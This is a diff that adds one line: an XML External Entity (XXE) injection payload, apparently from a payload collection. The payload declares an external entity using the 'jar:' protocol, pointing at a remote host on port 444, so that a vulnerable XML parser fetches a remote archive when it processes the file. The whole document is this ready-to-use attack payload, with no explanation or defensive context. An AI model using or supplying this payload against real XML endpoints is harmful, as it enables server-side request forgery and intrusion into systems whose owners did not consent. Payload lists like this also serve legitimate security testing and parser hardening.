@@ -1,0 +1,1 @@
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [  <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "jar:http://192.168.57.100:444/jar!/" >]><foo>&xxe;</foo>
